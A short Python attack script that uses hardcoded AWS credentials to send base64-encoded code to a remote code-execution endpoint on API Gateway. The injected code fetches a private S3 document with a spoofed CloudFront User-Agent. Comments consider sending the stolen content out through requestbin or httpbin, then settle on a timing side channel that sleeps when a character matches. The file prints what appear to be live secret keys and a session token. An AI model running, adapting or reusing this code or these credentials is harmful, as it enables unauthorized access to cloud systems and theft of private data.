import base64
import requests
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYINWI54QUF",
                       aws_secret_access_key="vzoDaHLWP97VayPQRZpwLhu9+wucg+FdyJbsgKBQ",
                       aws_token="IQoJb3JpZ2luX2VjELX//////////wEaDGlsLWNlbnRyYWwtMSJGMEQCICgyqloerkVTXTE5628Kp386BsQLYbXsQC4+rOu6I0INAiALeJaaL7isClSF+8qxnBZHA9Hk+WTg7zcTBxBBIzGtyiq1AggiEAAaDDEyMTc3NDA1Mjg4MCIM+Rpw/jafiBZf85MDKpICyLS9DUhUvWvbZ96LLt/M2kRPwKA2Cz68ISWVyBt/A7mKpJ0/E0HNdzCBZod2V2B2A+e2pm7A0yd/0pcb4t7MErEMgPBMoIzOywtMhleclfugWQqI52Do/aUoiR3cPNfBXutl/fYMykNSRZIkU+r1RywE1Yy3nbDy9zGpa2tfXU5plezMGPO15sxKYFz6PClI98LayWhEiEl89hTv5oAdzK+O3ONrp2TM8IyZf7G3eA3t9BP1Kl19E/NtsNZkQCYQwIbOMgRbAkQMvZCBKXilYo1GUVQvrGmeoyZq3LGOgj9o9bxa5jV+Kg4TSRTdL5R0yqeQrhiq3uJBh3ybX+8lnKs+auiOvaava6lGaGyL5KdwXzCu58vTBjqeARTzARMyhUPkGpGGVOScggiv11wG1cCI039vSFoWRPBrCt2Kt1K6+sJqTm4Jxbkg0A0ca6yLHbGxCkq6f3nrdRfuDiBVACtArW8jBjgxp+saXsdfHpS6xTaGTGk8kSE7PBtzeSYzug2gmQdMjL1+LlotY2UVvcIft1FSc8YxPWu62NeRcPyGJMkbHLS/6VJcRAhPg/Vnbx9m/gkhpvl7",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

def execute_code(python_code):
    encoded_code = base64.b64encode(python_code.encode('utf-8')).decode('utf-8')
    payload = {"code": encoded_code}
    url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
    response = requests.post(url, json=payload, auth=auth)
    return response.json()

if __name__ == "__main__":
    code = """
import urllib.request
import urllib.error

url = "https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/docs.html"
req = urllib.request.Request(url, headers={"User-Agent": "Amazon CloudFront"})
try:
    response = urllib.request.urlopen(req, timeout=5)
    content = response.read().decode('utf-8')
    # If successful, exfiltrate the first 100 chars using the boolean sleep trick or error message?
    # Wait, we can't exfiltrate easily if it succeeds.
    # Let's just raise an Exception with the content so it might get logged, or we can send it to requestbin!
    import urllib.parse
    # We don't have requestbin, but we can send it to httpbin and we can't see httpbin.
    # We can raise Exception to see if it's caught. But the API Gateway catches it and returns 'Something went wrong!'.
    
    # Exfiltrate using timing! 
    # If the first character is '<', sleep 3 seconds.
    if content[0] == '<':
        import time; time.sleep(3)
except Exception as e:
    pass
"""
    result = execute_code(code)
    print("Execution Result:", result)
